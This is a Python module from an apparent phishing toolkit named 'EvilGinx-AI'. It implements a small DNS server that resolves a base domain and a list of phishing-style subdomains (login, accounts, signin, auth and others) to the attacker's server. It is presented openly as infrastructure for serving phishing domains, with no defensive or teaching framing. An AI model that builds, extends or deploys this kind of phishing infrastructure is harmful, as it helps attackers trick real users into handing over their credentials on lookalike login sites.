"""
DNS Server for EvilGinx-AI
Implements DNS resolution for phishing domains
"""

import asyncio
import socket
import struct
import logging
from typing import Dict, List, Tuple

logger = logging.getLogger(__name__)

class DNSServer:
    """Simple DNS server for redirecting phishing domains"""
    
    def __init__(self, config):
        self.config = config
        self.dns_records = {}
        self._setup_dns_records()
    
    def _setup_dns_records(self):
        """Setup DNS records for phishing domains"""
        # Get server IP (for simplicity, use localhost)
        server_ip = "127.0.0.1"
        
        # Add records for base domain and subdomains
        base_domain = self.config.get('base_domain', 'example.com')
        
        # Common subdomains used in phishing
        subdomains = [
            'accounts', 'login', 'secure', 'auth', 'mail', 'www',
            'signin', 'portal', 'admin', 'api', 'app'
        ]
        
        # Add A records
        self.dns_records[base_domain] = server_ip
        for subdomain in subdomains:
            self.dns_records[f"{subdomain}.{base_domain}"] = server_ip
        
        logger.info(f"DNS records configured for {base_domain} and subdomains")
    
    async def start(self):
        """Start the DNS server"""
        try:
            # Create UDP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', self.config.get('dns_port', 53)))
            sock.setblocking(False)
            
            logger.info(f"DNS server started on port {self.config.get('dns_port', 53)}")
            
            while True:
                try:
                    # Receive DNS query
                    data, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 512)
                    
                    # Process query in background
                    asyncio.create_task(self._handle_dns_query(sock, data, addr))
                    
                except Exception as e:
                    logger.error(f"DNS server error: {e}")
                    await asyncio.sleep(0.1)
                    
        except PermissionError:
            logger.warning("DNS server requires root privileges for port 53. Running on port 5353 instead.")
            # Fallback to unprivileged port
            await self._start_unprivileged()
        except Exception as e:
            logger.error(f"Failed to start DNS server: {e}")
    
    async def _start_unprivileged(self):
        """Start DNS server on unprivileged port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(('0.0.0.0', 5353))
            sock.setblocking(False)
            
            logger.info("DNS server started on port 5353 (unprivileged)")
            
            while True:
                try:
                    data, addr = await asyncio.get_event_loop().sock_recvfrom(sock, 512)
                    asyncio.create_task(self._handle_dns_query(sock, data, addr))
                except Exception as e:
                    logger.error(f"DNS server error: {e}")
                    await asyncio.sleep(0.1)
                    
        except Exception as e:
            logger.error(f"Failed to start unprivileged DNS server: {e}")
    
    async def _handle_dns_query(self, sock, data, addr):
        """Handle incoming DNS query"""
        try:
            # Parse DNS query
            query_info = self._parse_dns_query(data)
            
            if not query_info:
                return
            
            domain = query_info['domain']
            query_type = query_info['type']
            query_id = query_info['id']
            
            logger.debug(f"DNS query from {addr}: {domain} (type {query_type})")
            
            # Check if we have a record for this domain
            if domain in self.dns_records and query_type == 1:  # A record
                ip = self.dns_records[domain]
                response = self._build_dns_response(query_id, domain, ip, data)
                
                await asyncio.get_event_loop().sock_sendto(sock, response, addr)
                logger.info(f"DNS response sent: {domain} -> {ip}")
            else:
                # Forward to upstream DNS or return NXDOMAIN
                logger.debug(f"No record found for {domain}")
                
        except Exception as e:
            logger.error(f"DNS query handling error: {e}")
    
    def _parse_dns_query(self, data):
        """Parse DNS query packet"""
        try:
            if len(data) < 12:
                return None
            
            # Parse header
            query_id = struct.unpack('>H', data[0:2])[0]
            flags = struct.unpack('>H', data[2:4])[0]
            
            # Check if it's a query
            if (flags >> 15) != 0:  # QR bit should be 0 for query
                return None
            
            # Parse question section
            offset = 12
            domain_parts = []
            
            while offset < len(data):
                length = data[offset]
                if length == 0:
                    offset += 1
                    break
                
                if length > 63:  # Compression pointer
                    offset += 2
                    break
                
                offset += 1
                if offset + length > len(data):
                    return None
                
                domain_parts.append(data[offset:offset + length].decode('ascii'))
                offset += length
            
            if offset + 4 > len(data):
                return None
            
            domain = '.'.join(domain_parts)
            query_type = struct.unpack('>H', data[offset:offset + 2])[0]
            
            return {
                'id': query_id,
                'domain': domain,
                'type': query_type
            }
            
        except Exception as e:
            logger.error(f"DNS query parsing error: {e}")
            return None
    
    def _build_dns_response(self, query_id, domain, ip, original_query):
        """Build DNS response packet"""
        try:
            # Header
            response = struct.pack('>H', query_id)  # ID
            response += struct.pack('>H', 0x8180)   # Flags (response, no error)
            response += struct.pack('>H', 1)        # Questions
            response += struct.pack('>H', 1)        # Answers
            response += struct.pack('>H', 0)        # Authority RRs
            response += struct.pack('>H', 0)        # Additional RRs
            
            # Question section (copy from original query)
            question_start = 12
            question_end = question_start
            
            # Find end of question section
            while question_end < len(original_query):
                length = original_query[question_end]
                if length == 0:
                    question_end += 5  # null byte + type + class
                    break
                question_end += length + 1
            
            response += original_query[question_start:question_end]
            
            # Answer section
            response += struct.pack('>H', 0xc00c)   # Name (pointer to question)
            response += struct.pack('>H', 1)        # Type A
            response += struct.pack('>H', 1)        # Class IN
            response += struct.pack('>L', 300)      # TTL
            response += struct.pack('>H', 4)        # Data length
            
            # IP address
            ip_parts = ip.split('.')
            for part in ip_parts:
                response += struct.pack('B', int(part))
            
            return response
            
        except Exception as e:
            logger.error(f"DNS response building error: {e}")
            return b''
    
    def add_record(self, domain, ip):
        """Add DNS record"""
        self.dns_records[domain] = ip
        logger.info(f"Added DNS record: {domain} -> {ip}")
    
    def remove_record(self, domain):
        """Remove DNS record"""
        if domain in self.dns_records:
            del self.dns_records[domain]
            logger.info(f"Removed DNS record: {domain}")
    
    def get_records(self):
        """Get all DNS records"""
        return self.dns_records.copy()

